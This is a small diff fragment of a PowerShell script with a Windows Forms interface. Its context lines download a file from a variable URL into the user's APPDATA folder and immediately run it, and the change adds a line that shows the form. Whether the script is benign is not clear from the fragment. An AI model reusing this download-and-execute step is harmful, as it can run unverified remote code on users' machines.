@@ -222,3 +222,4 @@ Clear-Host
 (New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
 Start-Process ("$env:APPDATA\$ProcName")
 }
+[void]$Form.ShowDialog()
